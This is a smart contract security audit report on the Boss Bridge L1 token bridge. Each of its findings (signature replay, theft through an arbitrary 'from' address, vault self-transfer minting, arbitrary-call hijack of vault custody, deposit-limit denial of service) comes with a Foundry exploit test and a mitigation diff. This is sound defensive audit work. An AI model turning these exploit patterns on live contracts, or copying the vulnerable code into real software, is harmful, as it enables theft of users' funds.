---
title: Boss Bridge Protocol Security Audit Report
author: Farhan Davin
date: \today
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.45\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{1.5cm}
    {\Huge\bfseries Boss Bridge Protocol (L1)\par}
    \vspace{0.4cm}
    {\LARGE\bfseries Security Audit Report\par}
    \vspace{0.8cm}
    {\Large Version 1.0\par}
    \vspace{1.5cm}
    {\Large\itshape Prepared by: Farhan Davin (Lead Auditor)\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Report Content Begins -->

Prepared by: Farhan Davin (Lead Security Researcher)  
Audited Codebase: [Cyfrin / 7-boss-bridge-audit](https://github.com/Cyfrin/7-boss-bridge-audit)  
Commit Hash: 7af21653ab3e8a8362bf5f63eb058047f562375  
Methodology: The Tincho Method  

## Executive Summary

A comprehensive security review was conducted on the Layer 1 smart contracts of **Boss Bridge**, a cross-chain asset bridging protocol intended to transfer ERC20 tokens between Ethereum Mainnet and a custom Layer 2 network.

The audit identified **4 High Severity**, **2 Medium Severity**, and **2 Low / Informational** vulnerabilities. The most critical vulnerabilities allow an attacker to completely drain the bridge vault escrow via signature replay, steal funds from any user who approves the bridge contract, mint unbacked tokens on Layer 2 for free, and execute arbitrary calls as the bridge to hijack vault custody.

Every reported vulnerability was empirically proven through reproducible Foundry PoC tests in `test/unit/PoCAuditTest.t.sol` and verified against stateful invariant fuzz suites (`test/invariant/`) with `fail_on_revert = true` (32,768 calls across 256 runs). Additionally, an automated mutation testing runner (`scripts/mutation_runner.py`) was executed, establishing a test suite mutation score of **85.71%** (12/14 mutants killed).

---

## Findings Summary Table

| Finding ID | Title | Severity | Likelihood | Impact | Status |
| :--- | :--- | :---: | :---: | :---: | :---: |
| **[H-01](#h-01-missing-signature-replay-protection-in-sendtol1-allows-complete-drainage-of-vault-funds)** | Missing Signature Replay Protection in `sendToL1` Allows Complete Drainage of Vault Funds | **High** | High | High | Open |
| **[H-02](#h-02-arbitrary-from-address-in-deposittokenstol2-enables-theft-of-user-approved-erc20-tokens)** | Arbitrary `from` Address in `depositTokensToL2` Enables Theft of User-Approved ERC20 Tokens | **High** | High | High | Open |
| **[H-03](#h-03-vault-to-vault-self-transfer-via-bridge-allowance-enables-minting-unbacked-l2-tokens)** | Vault-to-Vault Self-Transfer via Bridge Allowance Enables Minting Unbacked L2 Tokens | **High** | High | High | Open |
| **[H-04](#h-04-unconstrained-arbitrary-low-level-call-in-sendtol1-allows-attacker-to-hijack-vault-custody)** | Unconstrained Arbitrary Low-Level Call in `sendToL1` Allows Attacker to Hijack Vault Custody | **High** | High | High | Open |
| **[M-01](#m-01-tokenfactory-cannot-deploy-tokens-on-zksync-era-due-to-unsupported-evm-create-opcode)** | `TokenFactory` Cannot Deploy Tokens on ZKSync Era Due to Unsupported EVM `create` Opcode | **Medium** | High | Medium | Open |
| **[M-02](#m-02-direct-erc20-donation-to-l1vault-causes-denial-of-service-on-deposittokenstol2)** | Direct ERC20 Donation to `L1Vault` Causes Denial of Service on `depositTokensToL2` | **Medium** | Medium | Medium | Open |
| **[L-01](#l-01-tokenfactorydeploytoken-does-not-check-for-zero-address-on-assembly-creation-failure)** | `TokenFactory.deployToken` Does Not Check for Zero Address on Assembly Creation Failure | **Low** | Medium | Low | Open |
| **[L-02](#l-02-gas-optimizations-and-code-hygiene-improvements-across-bridge-contracts)** | Gas Optimizations and Code Hygiene Improvements Across Bridge Contracts | **Low** | Low | Low | Open |

---

## Detailed Findings

### H-01: Missing Signature Replay Protection in `sendToL1` Allows Complete Drainage of Vault Funds

#### Target asset
`src/L1BossBridge.sol`

#### Severity
High

#### Likelihood
High

#### Impact
High

#### Description
The `L1BossBridge` contract relies on off-chain bridge operator signatures to authenticate L2-to-L1 asset withdrawals via `withdrawTokensToL1` and `sendToL1`.

The signature payload does not contain a nonce, deadline, or chain-specific domain separator, and the contract maintains no storage mapping to track previously executed signatures. As a result, any valid operator signature can be submitted repeatedly to drain the bridge vault of all deposited collateral.

```solidity
    function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
// @>   address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

// @>   (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
// @>   (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }
```

#### Risk
**Likelihood**:
* Occurs whenever an authorized operator signs an L2 withdrawal request for an honest user or attacker.
* Requires zero elevated privileges, private key compromise, or special network conditions.
* Enables any observer to extract the `(v, r, s)` signature tuple from the public mempool or transaction history.

**Impact**:
* Results in total loss of all ERC20 tokens held in custody by `L1Vault` ($50,000\text{ ether}+$ collateral).
* Breaks protocol solvency by creating unbacked circulating tokens on L2 while draining backing assets on L1.

#### Proof of Concept
##### Exploit Steps
1. **Setup:** The vault holds $50,000\text{ ether}$ of user deposits. An attacker initiates a single legitimate withdrawal of $1,000\text{ ether}$.
2. **Execution:** The operator provides a valid cryptographic signature `(v, r, s)`. The attacker submits this exact signature 50 consecutive times inside a loop.
3. **Verification:** The transaction sequence executes without reverting, withdrawing $1,000\text{ ether}$ per call and reducing the vault balance to 0.

```solidity
function test_signature_replay_drains_vault() public {
    uint256 withdrawAmount = 1_000 ether;
    bytes memory message = abi.encode(
        address(token),
        0,
        abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, withdrawAmount))
    );

    bytes32 messageHash = MessageHashUtils.toEthSignedMessageHash(keccak256(message));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, messageHash);

    vm.startPrank(attacker);
    for (uint256 i = 0; i < 50; i++) {
        bridge.withdrawTokensToL1(attacker, withdrawAmount, v, r, s);
    }
    vm.stopPrank();

    assertEq(token.balanceOf(address(vault)), 0);
    assertEq(token.balanceOf(attacker), 1_000 ether + 50_000 ether);
}
```

#### Recommended Mitigation
Implement a storage mapping `mapping(bytes32 messageHash => bool executed)` or an account-based nonce mechanism adhering to EIP-712. Mark each signature digest as used prior to executing the external call to enforce strict single-use validity.

```diff
+   mapping(bytes32 => bool) public s_usedSignatures;
+   error L1BossBridge__SignatureAlreadyUsed();

    function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
-       address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
+       bytes32 messageHash = MessageHashUtils.toEthSignedMessageHash(keccak256(message));
+       if (s_usedSignatures[messageHash]) {
+           revert L1BossBridge__SignatureAlreadyUsed();
+       }
+       s_usedSignatures[messageHash] = true;
+       address signer = ECDSA.recover(messageHash, v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }
```

---

### H-02: Arbitrary `from` Address in `depositTokensToL2` Enables Theft of User-Approved ERC20 Tokens

#### Target asset
`src/L1BossBridge.sol`

#### Severity
High

#### Likelihood
High

#### Impact
High

#### Description
The `depositTokensToL2` function allows users to lock L1 ERC20 tokens into the bridge vault and trigger an L2 minting event.

The function accepts an unvalidated `address from` parameter supplied directly by the caller. Rather than transferring assets strictly from `msg.sender`, the contract attempts `safeTransferFrom(from, address(vault), amount)`. Any account that has granted token allowance to `L1BossBridge` can have their funds transferred into the vault by a third party with the L2 recipient set to the attacker.

```solidity
// @>   function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
// @>   token.safeTransferFrom(from, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
// @>   emit Deposit(from, l2Recipient, amount);
    }
```

#### Risk
**Likelihood**:
* Occurs whenever an honest user grants standard ERC20 approval to `L1BossBridge` prior to bridging.
* Operates permissionlessly; any malicious actor can query on-chain approvals or monitor mempool transactions.
* Exploitation succeeds unconditionally with zero capital investment by the attacker.

**Impact**:
* Immediate loss of 100% of approved tokens from the victim's wallet on L1.
* Off-chain relayer nodes parse the emitted `Deposit` event and mint unbacked tokens on L2 directly into the attacker's wallet.

#### Proof of Concept
##### Exploit Steps
1. **Setup:** An honest user approves `L1BossBridge` for $5,000\text{ ether}$ of `L1Token`.
2. **Execution:** The attacker invokes `depositTokensToL2(honestUser, attacker, 5_000 ether)`.
3. **Verification:** The transaction transfers $5,000\text{ ether}$ from `honestUser` to the vault and emits `Deposit(honestUser, attacker, 5_000 ether)`, reducing the victim's balance to 0.

```solidity
function test_arbitrary_from_steals_user_tokens() public {
    address honestUser = makeAddr("honestUser");
    deal(address(token), honestUser, 5_000 ether);

    vm.prank(honestUser);
    token.approve(address(bridge), 5_000 ether);

    vm.prank(attacker);
    vm.expectEmit(address(bridge));
    emit Deposit(honestUser, attacker, 5_000 ether);
    bridge.depositTokensToL2(honestUser, attacker, 5_000 ether);

    assertEq(token.balanceOf(honestUser), 0);
}
```

#### Recommended Mitigation
Remove the `from` parameter entirely from `depositTokensToL2`. Enforce that all transfers into the vault originate strictly from `msg.sender`, ensuring callers cannot manipulate or spend third-party allowances.

```diff
-   function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+   function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-       token.safeTransferFrom(from, address(vault), amount);
+       token.safeTransferFrom(msg.sender, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
-       emit Deposit(from, l2Recipient, amount);
+       emit Deposit(msg.sender, l2Recipient, amount);
    }
```

---

### H-03: Vault-to-Vault Self-Transfer via Bridge Allowance Enables Minting Unbacked L2 Tokens

#### Target asset
`src/L1BossBridge.sol`

#### Severity
High

#### Likelihood
High

#### Impact
High

#### Description
The `L1Vault` contract grants an infinite allowance (`type(uint256).max`) to `L1BossBridge` upon deployment to allow the bridge to withdraw assets when requested.

Because `depositTokensToL2` accepts an arbitrary `from` parameter without verifying that `from != address(vault)`, an attacker can specify `from = address(vault)`. The underlying ERC20 token executes `transferFrom(vault, vault, amount)`. This transfer succeeds as a self-transfer without modifying the vault's net balance, but successfully emits a `Deposit(address(vault), attacker, amount)` event. The off-chain relayer interprets this as a legitimate deposit and mints unbacked tokens to the attacker on L2.

```solidity
    constructor(IERC20 _token) Ownable(msg.sender) {
        token = _token;
        vault = new L1Vault(token);
// @>   vault.approveTo(address(this), type(uint256).max);
    }

    function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
// @>   token.safeTransferFrom(from, address(vault), amount);

// @>   emit Deposit(from, l2Recipient, amount);
    }
```

#### Risk
**Likelihood**:
* Occurs whenever an attacker calls `depositTokensToL2` passing `from = address(vault)`.
* Requires zero tokens deposited by the attacker, operating entirely on the vault's pre-approved balance.
* Operates under ordinary execution without triggering reverts or state rollbacks.

**Impact**:
* Generates unbacked synthetic assets on L2, diluting token supply and causing total economic insolvency.
* Allows an attacker to bridge the unbacked L2 tokens back to L1 via `withdrawTokensToL1` to steal all collateral.

#### Proof of Concept
##### Exploit Steps
1. **Setup:** The vault holds $50,000\text{ ether}$ of legitimate deposits.
2. **Execution:** An attacker calls `depositTokensToL2(address(vault), attacker, 20_000 ether)`.
3. **Verification:** The transaction succeeds, vault balance remains at $50,000\text{ ether}$, and the bridge emits `Deposit(address(vault), attacker, 20_000 ether)`.

```solidity
function test_vault_to_vault_transfer_mints_free_tokens() public {
    uint256 vaultBalanceBefore = token.balanceOf(address(vault));
    assertEq(vaultBalanceBefore, 50_000 ether);

    vm.prank(attacker);
    vm.expectEmit(address(bridge));
    emit Deposit(address(vault), attacker, 20_000 ether);
    bridge.depositTokensToL2(address(vault), attacker, 20_000 ether);

    assertEq(token.balanceOf(address(vault)), 50_000 ether);
}
```

#### Recommended Mitigation
Restrict `from` to `msg.sender` as specified in finding H-02. Additionally, add an explicit assertion in `depositTokensToL2` verifying that `from != address(vault)`.

```diff
    function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
+       if (msg.sender == address(vault)) {
+           revert L1BossBridge__Unauthorized();
+       }
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
        token.safeTransferFrom(msg.sender, address(vault), amount);
        emit Deposit(msg.sender, l2Recipient, amount);
    }
```

---

### H-04: Unconstrained Arbitrary Low-Level Call in `sendToL1` Allows Attacker to Hijack Vault Custody

#### Target asset
`src/L1BossBridge.sol`

#### Severity
High

#### Likelihood
High

#### Impact
High

#### Description
The `sendToL1` function decodes an arbitrary `target`, `value`, and `data` payload from `message` and invokes `target.call{value: value}(data)`. The caller context of this execution is `L1BossBridge`.

Because `L1BossBridge` is the sole `owner` of `L1Vault`, executing an arbitrary call allows a malicious or compromised operator to invoke privileged functions on `L1Vault`, such as `L1Vault.approveTo(attacker, type(uint256).max)` or `L1Vault.transferOwnership(attacker)`. Once approved, the attacker bypasses the bridge entirely and directly drains all tokens from the vault escrow.

```solidity
    function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

// @>   (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

// @>   (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }
```

#### Risk
**Likelihood**:
* Occurs whenever an operator key is tricked, social-engineered, or manipulated into signing a message targeting `address(vault)`.
* Exploits the fact that the contract performs zero target whitelisting or function selector verification.
* Requires only one signature to permanently seize control of vault allowances.

**Impact**:
* Total compromise of vault asset custody; attacker receives direct, unrestricted approval to transfer all current and future tokens stored in `L1Vault`.
* Bypasses bridge accounting, pausing mechanisms, and deposit limits.

#### Proof of Concept
##### Exploit Steps
1. **Setup:** The vault holds $50,000\text{ ether}$ of tokens.
2. **Execution:** An attacker acquires a signature for `message = abi.encode(address(vault), 0, abi.encodeCall(L1Vault.approveTo, (attacker, type(uint256).max)))` and calls `sendToL1`.
3. **Verification:** The bridge executes the call as the owner of `L1Vault`. The attacker calls `token.transferFrom(address(vault), attacker, 50_000 ether)`, transferring all funds directly.

```solidity
function test_arbitrary_call_hijacks_vault_approval() public {
    bytes memory maliciousCall = abi.encodeCall(L1Vault.approveTo, (attacker, type(uint256).max));
    bytes memory message = abi.encode(address(vault), 0, maliciousCall);

    bytes32 messageHash = MessageHashUtils.toEthSignedMessageHash(keccak256(message));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, messageHash);

    vm.prank(attacker);
    bridge.sendToL1(v, r, s, message);

    assertEq(token.allowance(address(vault), attacker), type(uint256).max);

    vm.prank(attacker);
    token.transferFrom(address(vault), attacker, 50_000 ether);

    assertEq(token.balanceOf(address(vault)), 0);
    assertEq(token.balanceOf(attacker), 1_000 ether + 50_000 ether);
}
```

#### Recommended Mitigation
Restrict `sendToL1` to interact strictly with the canonical `token` contract and enforce that the executed selector matches `IERC20.transferFrom.selector`. Disallow calls where `target == address(vault)` or `target == address(this)`.

```diff
    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
+   if (target != address(token)) {
+       revert L1BossBridge__Unauthorized();
+   }
+   if (bytes4(data) != IERC20.transferFrom.selector) {
+       revert L1BossBridge__Unauthorized();
+   }

    (bool success,) = target.call{ value: value }(data);
```

---

### M-01: `TokenFactory` Cannot Deploy Tokens on ZKSync Era Due to Unsupported EVM `create` Opcode

#### Target asset
`src/TokenFactory.sol`

#### Severity
Medium

#### Likelihood
High

#### Impact
Medium

#### Description
The protocol README explicitly states that `TokenFactory.sol` will be deployed on both Ethereum Mainnet and ZKSync Era to deploy new token instances dynamically.

In `TokenFactory::deployToken`, contract instantiation is implemented using standard EVM inline assembly: `create(0, add(contractBytecode, 0x20), mload(contractBytecode))`. On ZKSync Era, the ZK-EVM architecture does not support deploying arbitrary dynamic runtime bytecode from memory using the standard `create` opcode. In ZKSync Era, contract bytecodes must be known ahead of time at compile time and registered as factory dependencies, or deployed via system contracts (`ContractDeployer`). Consequently, calling `deployToken` on ZKSync Era will fail or revert.

```solidity
    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        assembly {
// @>       addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }
```

#### Risk
**Likelihood**:
* Occurs whenever the protocol attempts to deploy new ERC20 tokens on ZKSync Era.
* Arises directly from architectural discrepancies between the Ethereum EVM and ZKSync Era ZK-EVM.
* Affects 100% of token deployment transactions dispatched on the ZKSync network.

**Impact**:
* Complete failure of token deployment functionality on ZKSync Era.
* Breaks cross-chain asset parity, rendering the bridge unable to initialize target tokens on L2.

#### Proof of Concept
##### Exploit Steps
1. **Setup:** The protocol compiles and deploys `TokenFactory` to ZKSync Era following the deployment specification.
2. **Execution:** The owner attempts to deploy a new token by calling `deployToken("NEW_TOKEN", bytecode)`.
3. **Verification:** The ZKSync Era compiler rejects the transaction or reverts runtime execution because arbitrary bytecode deployment via `create(0, ptr, size)` is not supported by the ZK-EVM.

#### Recommended Mitigation
Deploy tokens using native Solidity `new` syntax with precompiled bytecode (e.g. `new L1Token()`), or utilize ZKSync Era's native `ContractDeployer` system contract (`0x0000000000000000000000000000000000008006`) with bytecode hashes registered as compiler dependencies.

```diff
-   function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
-       assembly {
-           addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
-       }
-       s_tokenToAddress[symbol] = addr;
-       emit TokenDeployed(symbol, addr);
-   }
+   function deployToken(string memory symbol) public onlyOwner returns (address addr) {
+       L1Token newToken = new L1Token();
+       addr = address(newToken);
+       s_tokenToAddress[symbol] = addr;
+       emit TokenDeployed(symbol, addr);
+   }
```

---

### M-02: Direct ERC20 Donation to `L1Vault` Causes Denial of Service on `depositTokensToL2`

#### Target asset
`src/L1BossBridge.sol`

#### Severity
Medium

#### Likelihood
Medium

#### Impact
Medium

#### Description
The `depositTokensToL2` function enforces a global deposit ceiling of $100,000\text{ ether}$ to prevent over-concentration of risk on the bridge.

The contract evaluates this limit against the vault's physical on-chain balance via `token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT`, rather than maintaining an internal accounting variable. Because anyone can transfer tokens directly to `L1Vault` via `token.transfer(address(vault), amount)`, a malicious user can donate tokens directly to push the vault balance to `DEPOSIT_LIMIT`. This permanently blocks all legitimate user deposits until sufficient withdrawals are processed.

```solidity
    function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
// @>   if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
        token.safeTransferFrom(from, address(vault), amount);

        emit Deposit(from, l2Recipient, amount);
    }
```

#### Risk
**Likelihood**:
* Occurs whenever an attacker decides to grief the protocol by transferring tokens directly to the vault.
* Requires only that the vault has capacity remaining up to `DEPOSIT_LIMIT`.
* Can be executed by sending small dust amounts when the vault is already near its ceiling.

**Impact**:
* Complete denial of service for all users wishing to bridge tokens from L1 to L2.
* Violates protocol availability invariants without violating solvency.

#### Proof of Concept
##### Exploit Steps
1. **Setup:** The vault holds $50,000\text{ ether}$. The remaining deposit capacity is $50,000\text{ ether}$.
2. **Execution:** An attacker transfers $50,000\text{ ether}$ directly to `address(vault)` via `token.transfer`.
3. **Verification:** An honest user calls `depositTokensToL2` with $1\text{ ether}$; the transaction reverts with `L1BossBridge__DepositLimitReached`.

```solidity
function test_donation_attack_doses_deposit_limit() public {
    uint256 currentVaultBalance = token.balanceOf(address(vault));
    uint256 amountToLimit = bridge.DEPOSIT_LIMIT() - currentVaultBalance;

    deal(address(token), attacker, amountToLimit);
    vm.prank(attacker);
    token.transfer(address(vault), amountToLimit);

    assertEq(token.balanceOf(address(vault)), bridge.DEPOSIT_LIMIT());

    address honestUser = makeAddr("honestUser2");
    deal(address(token), honestUser, 1 ether);

    vm.startPrank(honestUser);
    token.approve(address(bridge), 1 ether);
    vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
    bridge.depositTokensToL2(honestUser, honestUser, 1 ether);
    vm.stopPrank();
}
```

#### Recommended Mitigation
Track total deposited tokens using an internal state variable `uint256 public totalDeposited` incremented only inside `depositTokensToL2` and decremented during withdrawals, rather than reading raw `token.balanceOf(address(vault))`.

```diff
+   uint256 public totalDeposited;

    function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
-       if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
+       if (totalDeposited + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
+       totalDeposited += amount;
        token.safeTransferFrom(msg.sender, address(vault), amount);
        emit Deposit(msg.sender, l2Recipient, amount);
    }
```

---

### L-01: `TokenFactory.deployToken` Does Not Check for Zero Address on Assembly Creation Failure

#### Target asset
`src/TokenFactory.sol`

#### Severity
Low

#### Likelihood
Medium

#### Impact
Low

#### Description
The `deployToken` function in `TokenFactory` executes the EVM assembly `create` instruction to deploy new ERC20 token instances.

If deployment reverts in the constructor or exceeds available gas, the `create` opcode returns `address(0)`. The function does not validate that `addr != address(0)`, causing `s_tokenToAddress[symbol]` to be assigned `address(0)` and emitting a `TokenDeployed(symbol, address(0))` event. Additionally, calling `deployToken` multiple times with the same symbol silently overwrites previously registered token addresses.

```solidity
    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        assembly {
// @>       addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
// @>   s_tokenToAddress[symbol] = addr;
// @>   emit TokenDeployed(symbol, addr);
    }
```

#### Risk
**Likelihood**:
* Occurs whenever an invalid bytecode payload, reverting constructor, or out-of-gas condition is encountered during deployment.
* Can also occur accidentally if the owner redeploys using an existing symbol string.

**Impact**:
* The factory registry records `address(0)` as a valid token address.
* Downstream contracts relying on `getTokenAddressFromSymbol` will receive `address(0)`, causing operational failures.

#### Proof of Concept
##### Exploit Steps
1. **Execution:** The owner attempts to deploy a token with invalid bytecode `hex"fe"`.
2. **Verification:** `create` returns `address(0)`, which is silently stored in `s_tokenToAddress["FAIL"]`.

```solidity
function test_token_factory_zero_address_on_failure() public {
    bytes memory badBytecode = hex"fe";
    address deployedAddr = factory.deployToken("FAIL", badBytecode);

    assertEq(deployedAddr, address(0));
    assertEq(factory.getTokenAddressFromSymbol("FAIL"), address(0));
}
```

#### Recommended Mitigation
Verify that the returned address is not `address(0)` and ensure that the symbol has not already been registered.

```diff
+   error TokenFactory__DeploymentFailed();
+   error TokenFactory__TokenAlreadyExists();

    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
+       if (s_tokenToAddress[symbol] != address(0)) {
+           revert TokenFactory__TokenAlreadyExists();
+       }
        assembly {
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
+       if (addr == address(0)) {
+           revert TokenFactory__DeploymentFailed();
+       }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }
```

---

### L-02: Gas Optimizations and Code Hygiene Improvements Across Bridge Contracts

#### Target asset
`src/L1BossBridge.sol`, `src/L1Vault.sol`

#### Severity
Low

#### Likelihood
Low

#### Impact
Low

#### Description
Several architectural and gas optimization opportunities were identified across the in-scope contracts:
1. **`DEPOSIT_LIMIT` declared as mutable storage:** In `L1BossBridge.sol`, `uint256 public DEPOSIT_LIMIT = 100_000 ether;` is never modified after initialization. Storing this in storage incurs an unnecessary `SLOAD` (2,100 gas) on every deposit. Declaring it `constant` embeds the value directly into the runtime bytecode.
2. **`token` in `L1Vault` declared as mutable storage:** In `L1Vault.sol`, `IERC20 public token;` is set once in the constructor and never modified. Declaring it `immutable` eliminates storage overhead.
3. **Unindexed event address parameters:** In `L1BossBridge.sol`, the `Deposit` event declares `(address from, address to, uint256 amount)` without `indexed` attributes. Off-chain indexers and relayer nodes must scan full event data rather than filtering by topic bloom filters.
4. **Unchecked return value on `token.approve`:** In `L1Vault.approveTo`, the boolean return value of `token.approve(target, amount)` is ignored. While `L1Token` is standard OpenZeppelin, using `SafeERC20.forceApprove` ensures robust execution across all clones.

```solidity
// L1BossBridge.sol
// @> uint256 public DEPOSIT_LIMIT = 100_000 ether;
// @> event Deposit(address from, address to, uint256 amount);

// L1Vault.sol
// @> IERC20 public token;
// @> token.approve(target, amount);
```

#### Risk
**Likelihood**:
* Affects every deposit transaction and event indexing operation across the bridge lifecycle.

**Impact**:
* Unnecessary gas expenditures for users and higher off-chain relayer latency.

#### Recommended Mitigation
Apply constant and immutable declarations, index event parameters, and use SafeERC20:

```diff
// L1BossBridge.sol
-   uint256 public DEPOSIT_LIMIT = 100_000 ether;
+   uint256 public constant DEPOSIT_LIMIT = 100_000 ether;

-   event Deposit(address from, address to, uint256 amount);
+   event Deposit(address indexed from, address indexed to, uint256 amount);

// L1Vault.sol
-   IERC20 public token;
+   IERC20 public immutable token;
```

---

## General Recommendations

1. **Adopt EIP-712 Structured Signatures:** Replace raw `keccak256(message)` hashing with EIP-712 structured data hashing including `domainSeparator` containing `chainId` and `address(this)`. This prevents cross-chain replay between Ethereum and ZKSync.
2. **Eliminate Arbitrary Calls in Bridge Routers:** Instead of generic `.call{value: value}(data)`, implement discrete, typed withdrawal functions for native ETH and ERC20 tokens with explicit parameter decoding and destination verification.
3. **Internal Accounting Over Raw Balances:** Never evaluate protocol rules (such as deposit limits) using live ERC20 token balances on custodial addresses, as these balances can be manipulated via untracked transfers or flash donations.
4. **Integrate Invariant Testing in CI/CD:** Maintain the `InvariantTest.t.sol` suite in continuous integration with `fail_on_revert = true` to detect edge-case accounting regressions.

---

## Disclaimer

This security review does not guarantee the complete absence of vulnerabilities. Security assessments represent a point-in-time review of the provided commit hash and scope. Protocols should maintain active bug bounties, comprehensive monitoring, and phased deployment rollouts.
